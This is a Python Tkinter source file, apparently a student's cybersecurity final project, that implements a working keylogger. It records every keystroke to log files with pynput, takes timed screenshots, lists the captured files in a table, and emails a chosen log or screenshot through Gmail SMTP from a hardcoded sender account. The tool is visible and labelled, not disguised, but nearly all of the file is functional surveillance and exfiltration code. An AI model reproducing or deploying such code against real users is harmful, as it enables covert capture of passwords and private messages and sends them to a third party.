#Author: Luciana Ramos Alves
#Date: 14.12.2021

#****************************************************************************
#           All the imports
#****************************************************************************
#import for create the interface GUI
from tkinter import *
from tkinter import ttk
from tkinter import messagebox

# emails libraries to email features
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import random
import os

#import pyscreenshot as ImageGrab
from PIL import ImageGrab
from pynput.keyboard import Key, Listener

#module to track the time and date
from datetime import datetime
import time

import data

global tb_results,q_img_contents,lbl_img,img, txt_contents
global email_filename, email_attachment,file_selected, toaddr
global v_txt_email, v_txt_seconds,v_txt_testing
global txt_email, txt_seconds,txt_testing


#****************************************************************************
#           All the functions
#****************************************************************************



#--------------------------------------------------------------------
# email controls/functionality - prepare email
def prepare_email():

    if str(v_txt_email.get()) != '':
        option = messagebox.askyesno("Confirm", "Do you confirm the send email ??")
        if option == True:
            send_email()
    else:
        messagebox.showwarning(title="Required Field", message="Email is required...")

#--------------------------------------------------------------------

# email controls/functionality - send the keystrokes to email
def send_email():
    
    global email_filename,email_attachment, toaddr
    toaddr = str(v_txt_email.get())
    fromaddr = 'collegepjct@gmail.com' #Enter disposable email here (email address of the sender)
    password = data.get_pass() # Will get the password storage on the data.py file

    # instance of MIMEMultipart
    # create a message (Multi internet mail extensions) allowing to format email msg to support character, text and attachments
    msg = MIMEMultipart()

    msg['From'] = 'collegepjct@gmail.com' #Enter the email address you want to send your information to (email address of the receiver)
    msg['To'] = toaddr
    msg['Subject'] = "Log File" # storing the subject

    body = "Keyloggers NCI HDCyb Final Project" #string to store the body of the mail
    msg.attach(MIMEText(body, 'plain')) #attach the body with the msg instance

    # attach the body with the msg instance
    filename = email_filename
    attachment = open(email_attachment, 'rb')

    # attach the body with the msg instance
    p = MIMEBase('application', 'octet-stream')

    # To change the payload into encoded form
    p.set_payload((attachment).read())

    # encode into base64
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename) # add header to the msg

    msg.attach(p) # attach the instance 'p' to instance 'msg'

    # attach the instance 'p' to instance 'msg'
    s = smtplib.SMTP('smtp.gmail.com', 587)#try to use another port 465
    s.starttls() # start TLS for security
    s.login(fromaddr, password) # Authentication

    text = msg.as_string() #Converts the Multipart msg into a string

    s.sendmail(fromaddr, toaddr, text) # sending the mail

    s.quit() # terminating the session

    messagebox.showinfo(title="Success", message="email Sent")
#--------------------------------------------------------------------
# choose option functionality -  keystrokes and/or screenshot
def process_options(v_write, v_screenshot):
    #ask user to choose an option
    if str(v_write.get()) != '1' and str(v_screenshot.get()) != '1':
        messagebox.showwarning(title="Warning", message="Please, Choose an options...")
    else:
        if str(v_write.get()) == '1':
            get_key_logger()
        #if user didn't set a screenshot timer a warning msg will come up
        if str(v_screenshot.get()) == '1':
            try:
                if int(str(v_txt_seconds.get())) > 0:
                    screenshot()
                else:
                    messagebox.showwarning(title="Warning", message="Please, set Screenshot timer")
            except Exception as e:
                
                msg_warning = "Please, check all the fields to see if is every thing alright...\n"
                msg_warning += "Checkbox options Keylogger is required, also Screenshot timer field is required\n"
                msg_warning += "if you will choose screenshot. Don't forget to enter a numeric value..."

                messagebox.showwarning(title="Warning", message=msg_warning)

#--------------------------------------------------------------------
# Capture screenshot functionality
def screenshot():

    #get screenshot timer and capture the screen using imageGrab
    try:
        
        wait_time = int(str(v_txt_seconds.get()))
        
        time.sleep(wait_time)

        date_now = datetime.now()
        str_date = date_now.strftime('%d%m%Y%H%M%f')
        print_name = '%s%s%s' % ('screenshots/screenshot_',str_date,'.png')
        
        #im = ImageGrab.grab()
        #im.save( print_name, 'png')
        im = ImageGrab.grab()  # grabbing image
        im.save(print_name)  # save to file

        list_files()

    except Exception as e:
        print(e)
        messagebox.showerror(title="Error", message="There was an error trying to capture the screenshot")
#--------------------------------------------------------------------
# Capture keystrokes functionality
def get_key_logger():
    global listner
    global log_file

    #get date and time the keystrokes were captured
    date_now = datetime.now()
    str_date = date_now.strftime('%d%m%Y%H%M%f')
    log_file = '%s%s%s' % ('logs/log_',str_date,'.txt')

    #listen keystrokes
    listner = Listener(on_press=on_press,on_release=on_release)
    listner.start()
#--------------------------------------------------------------------
# keystrokes logFile functionality
def on_press(key):
    global log_file

    # convert key pressed to string
    key_data = str(key)
    key_data = key_data.replace("'","")

    # open log file in append mode
    with open(log_file, "a") as f:
        f.write(key_data)
#--------------------------------------------------------------------        

def on_release(key):
    if key == Key.esc:
        return False
#--------------------------------------------------------------------        
#stop button functionality
def stop():
    on_release(Key.esc)
    messagebox.showinfo(title="Success", message="Capture process completed")
    list_files()
#--------------------------------------------------------------------
#delete button functionality
def delete_file():
    global file_selected

    #User will be asked to select the file he wants to delete - multi selection is not allowed
    try:
        if file_selected != '':
            option = messagebox.askyesno("Confirm","Do you want to delete this file ??")

            if option == True:
                if os.path.exists(file_selected):
                    os.remove(file_selected)
                    list_files()
        else:
            messagebox.showwarning(title="Warning", message="No file selected !!")
    except Exception as e:
        messagebox.showwarning(title="Warning", message="Make sure you have selected an item ...")
#--------------------------------------------------------------------        
def list_files():

    clear_table()
    set_image()
    set_file_contents()

    dir_screenshots = 'screenshots/'

    cont = len(tb_results.get_children())

    for dir,folders,files in os.walk(dir_screenshots):
        for f in files:
            
            path_screenshot = '%s%s' % ( str(dir),str(f) )

            time_c = os.path.getctime(path_screenshot)
            date_c = time.ctime(time_c)

            tb_results.insert(parent='',index='end',iid=cont,text='',
            values=('%s'%(str((cont + 1))),date_c,str(path_screenshot))) 
            cont = cont + 1           

    dir_logs = 'logs/'

    cont = len(tb_results.get_children())

    for dir,folders,files in os.walk(dir_logs):
        for f in files:
            
            path_file_log = '%s%s' % ( str(dir),str(f) )

            time_c = os.path.getctime(path_file_log)
            date_c = time.ctime(time_c)

            tb_results.insert(parent='',index='end',iid=cont,text='',
            values=('%s'%(str((cont + 1))),date_c,str(path_file_log))) 
            cont = cont + 1           

    tb_results.bind('<<TreeviewSelect>>', item_selected)
#--------------------------------------------------------------------
def clear_table():
    for i in tb_results.get_children():
        tb_results.delete(i)
#--------------------------------------------------------------------
def item_selected(event):
    
    global tb_results

    for selected_item in tb_results.selection():
        item = tb_results.item(selected_item)
        record = item['values']
        arr_file_record = str(record[2]).split('.')
        
        set_email_params(record[2])

        if  arr_file_record[ len(arr_file_record) - 1 ] == "png":
            set_image(record[2])
            set_file_contents()
        else:
            set_image()
            set_file_contents(record[2])
#--------------------------------------------------------------------

def set_email_params(f):
    global email_filename, email_attachment, file_selected
    arr_f = f.split('/')
    email_filename = arr_f[1]
    email_attachment = f
    file_selected = f
#--------------------------------------------------------------------

def set_image(path=""):
    
    global q_img_contents,lbl_img,img

    img = PhotoImage(file=str(path))
    lbl_img = Label(q_img_contents, image=img)
    lbl_img.place(x=5,y=5,width=470,height=250)
#--------------------------------------------------------------------

def set_file_contents(path=""):
    contents = ''

    if path != '':
        f = open(path,'r')
        lines = f.readlines()
        contents = contents.join(lines)
    
    txt_contents = Text(q_file_contents, background=background_labels, foreground=foreground_fields)
    txt_contents.place(x=mg_screen, y=mg_screen, width=470,height=250)

    txt_contents.insert( INSERT, str(contents) )
#--------------------------------------------------------------------
def reset_window():
    global txt_seconds,txt_email

    txt_seconds.delete(0,"end")
    txt_email.delete(0,"end")
    txt_testing.delete(0,"end")
    set_image()
    set_file_contents()
    list_files()
#--------------------------------------------------------------------




#this methods helps to define some elements dimension
def get_w_button(str):
    return (len(str) * 10)
#--------------------------------------------------------------------
def get_w_buttons(texts):
    
    max = 0
    
    for b in texts:
        if max < len(b):
            max = len(b)

    return (max * 10)
#--------------------------------------------------------------------
def get_h_container(h_screen, last_point_y, mg_screen):
    return (h_screen - last_point_y - (mg_screen * 2 ) )
#--------------------------------------------------------------------









#****************************************************************************
#           Construct the Window
#****************************************************************************







#dimensions and colors
global background_screen,background_frames,background_labels,background_checkbuttons
global background_fields,foreground_fields
global w_screen,h_screen,mg_screen,mg_frames
global last_point_x,last_point_y
global w_expand_frame_1,w_expand_frame_2,w_expand_frame_3,w_expand_frame_4

background_screen = "#696969"
background_frames = "#ddd"
background_labels = background_frames
background_checkbuttons = background_frames

background_fields = "#fff"
foreground_fields = "#000"

w_screen = 1320
h_screen = 650
mg_screen = 10
mg_frames = 5

last_point_x = 0
last_point_y = 0

w_expand_frame_1 = (w_screen - (mg_screen * 2))
w_expand_frame_2 = w_expand_frame_1 / 2
w_expand_frame_3 = w_expand_frame_1 / 3
w_expand_frame_4 = w_expand_frame_1 / 4

w_buttons = 60
h_buttons = 30
mg_buttons = 2

w_check_buttons = 60
h_check_buttons = 25
mg_check_buttons = 2

h_between_elements = 1
current_hg = 0

#create the basec screen
app = Tk() #call Tk execute

v_txt_email = StringVar()
v_txt_seconds = StringVar()
v_txt_testing = StringVar()

app.title("KeyLogger")
app.geometry( "{0}x{1}".format(w_screen, h_screen) ) #screen size horizontal e vertical
app.config(background=background_screen)
#app.iconbitmap('icons/window.ico')

#create the top frame
current_hg = 50
q_titulo = Frame(app, relief="flat", background=background_frames)
q_titulo.place( x=mg_screen,y=mg_screen,width=w_expand_frame_1,height=current_hg )

last_point_y += (current_hg + h_between_elements)

#elements at the top frame
Label(q_titulo, text="Keyl☢gger", background=background_labels, font=('Arial',25)).pack(
    side=LEFT, fill=X, expand=TRUE
)



#frame _checkbuttonsmands
current_hg = 40
q_buttons = Frame(app, relief="flat", background=background_frames)
q_buttons.place( x=mg_screen,y=mg_screen + last_point_y,width=w_expand_frame_1,height=current_hg )

last_point_y += (current_hg + h_between_elements)

w_buttons = get_w_buttons(["EventLog","Start","Stop"])

text_button = "EventLog"
Button(q_buttons, text=text_button, command=list_files).place(x=mg_buttons,y=mg_buttons,width=w_buttons,height=h_buttons)
last_point_x += (w_buttons + mg_buttons)

text_button = "Start"
Button(q_buttons, text=text_button, command=lambda:process_options(check_value_write, check_value_screenshot)).place(x=last_point_x,y=mg_buttons,width=w_buttons,height=h_buttons)
last_point_x += (w_buttons + mg_buttons)

text_button = "Stop"
Button(q_buttons, text=text_button, command=stop).place(x=last_point_x,y=mg_buttons,width=w_buttons,height=h_buttons)
last_point_x += (w_buttons + mg_buttons)

text_button = "Delete File"
Button(q_buttons, text=text_button, command=delete_file).place(x=last_point_x,y=mg_buttons,width=w_buttons,height=h_buttons)
last_point_x += (w_buttons + mg_buttons)

text_button = "Reset Window"
Button(q_buttons, text=text_button, command=reset_window).place(x=last_point_x,y=mg_buttons,width=w_buttons + 20,height=h_buttons)
last_point_x += (w_buttons + mg_buttons)

text_button = "Send Email"
Button(q_buttons, text=text_button, command=prepare_email).place(x=(w_expand_frame_1 - (w_buttons*2) ),y=mg_buttons,width=w_buttons,height=h_buttons)
last_point_x += (w_buttons + mg_buttons)

text_button = "Exit"
Button(q_buttons, text=text_button, command=app.destroy).place(x=(w_expand_frame_1 - w_buttons),y=mg_buttons,width=w_buttons,height=h_buttons)
last_point_x += (w_buttons + mg_buttons)




#frame to keylogger options
q_options_keylogger = Frame(app, relief="flat", background=background_frames)
q_options_keylogger.place( x=mg_screen,y=mg_screen + last_point_y,width=w_expand_frame_4,height=get_h_container(h_screen, last_point_y, mg_screen) )

#override the last_point_x  to put elements a new level
last_point_x = (mg_screen + w_expand_frame_4 + h_between_elements)

check_value_write = StringVar()
check_value_screenshot = StringVar()

cb_kl_write = Checkbutton(q_options_keylogger, text=" Keystrokes", background=background_checkbuttons, onvalue=1, offvalue=0, variable=check_value_write)
cb_kl_write.place(x=mg_frames,y=mg_frames,width=(w_expand_frame_4 - (mg_frames * 2)),height=h_check_buttons)

cb_kl_image = Checkbutton(q_options_keylogger, text="Screenshot", background=background_checkbuttons, onvalue=1, offvalue=0, variable=check_value_screenshot)
cb_kl_image.place(x=mg_frames,y=(mg_frames + (h_check_buttons)),width=(w_expand_frame_4 - (mg_frames * 2)),height=h_check_buttons)

y_temp_fields = mg_frames + (h_check_buttons * 2) + 20

Label(q_options_keylogger, text="Set screenshot timer",
    background="#ddd", 
    foreground="#000"        
).place(x=mg_frames,y=y_temp_fields,width=(w_expand_frame_4 - (mg_frames * 2)),height=h_check_buttons)

y_temp_fields += h_check_buttons

txt_seconds = Entry(q_options_keylogger, background="#fff", foreground="#000", textvariable=v_txt_seconds)
txt_seconds.place(x=mg_frames, y=y_temp_fields, width=(w_expand_frame_4 - (mg_frames * 2)),height=h_check_buttons)

y_temp_fields += h_check_buttons

Label(q_options_keylogger, text="Email Address", 
    background="#ddd", 
    foreground="#000"        
).place(x=mg_frames,y=y_temp_fields,width=(w_expand_frame_4 - (mg_frames * 2)),height=h_check_buttons)

y_temp_fields += h_check_buttons

txt_email = Entry(q_options_keylogger, background="#fff", foreground="#000", textvariable=v_txt_email)
txt_email.place(x=mg_frames, y=y_temp_fields, width=(w_expand_frame_4 - (mg_frames * 2)),height=h_check_buttons)

y_temp_fields += h_check_buttons + 30

Label(q_options_keylogger, text="You can unblock and test the event key \ntyping here...", 
    background="#ddd", 
    foreground="#000"        
).place(x=mg_frames,y=y_temp_fields - 25,width=(w_expand_frame_4 - (mg_frames * 2)),height=h_check_buttons * 3)

y_temp_fields += h_check_buttons + 10

txt_testing = Entry(q_options_keylogger, background="#fff", foreground="#000", textvariable=v_txt_testing)
txt_testing.place(x=mg_frames, y=y_temp_fields, width=(w_expand_frame_4 - (mg_frames * 2)),height=h_check_buttons * 5)

y_temp_fields += h_check_buttons * 5




#frame to keylogger results
q_keylogger_results = Frame(app, relief="flat", background=background_frames)
q_keylogger_results.place( x=last_point_x,y=mg_screen + last_point_y,width=((w_expand_frame_4 * 3)-h_between_elements),height=get_h_container(h_screen, last_point_y, mg_screen) / 2 )

h_tb_results = get_h_container(h_screen, last_point_y, mg_screen) - (mg_frames * 2)

tb_results = ttk.Treeview(q_keylogger_results,selectmode='browse')
tb_results.place(x=mg_frames,y=mg_frames,width=( (w_expand_frame_4 * 3) - (mg_frames * 2)), height=h_tb_results / 2 - 10)

vsb = ttk.Scrollbar(tb_results,orient="vertical",command=tb_results.yview)
vsb.place(x=( (w_expand_frame_4 * 3) - (mg_frames * 2)) - 15, y=mg_screen + 10, height=(get_h_container(h_screen, last_point_y, mg_screen) / 2) - 20)

tb_results.configure(yscrollcommand=vsb.set)


tb_results['columns'] = ("Register","Date","File Name")

tb_results.column("#0", width=0,  stretch=NO)
tb_results.column("Register",anchor=CENTER, width=20)
tb_results.column("Date",anchor=CENTER, width=60)
tb_results.column("File Name",anchor=CENTER,width=200)

tb_results.heading("#0",text="",anchor=CENTER)
tb_results.heading("Register",text="Register",anchor=CENTER)
tb_results.heading("Date",text="Date",anchor=CENTER)
tb_results.heading("File Name",text="File Name",anchor=CENTER)




#frame with file contents
q_file_contents = Frame(app, relief="flat", background=background_frames)
q_file_contents.place( x=last_point_x,y=last_point_y+280,width=(w_expand_frame_4 * 3)/2,height=get_h_container(h_screen, last_point_y, mg_screen) / 2 - 1)

q_img_contents = Frame(app, relief="flat", background=background_frames)
q_img_contents.place( x=last_point_x + (w_expand_frame_4 * 3)/2 + 1,y=last_point_y+280,width=(w_expand_frame_4 * 3)/2-2,height=get_h_container(h_screen, last_point_y, mg_screen) / 2 - 1)

list_files()

#builder and show the screen
app.mainloop()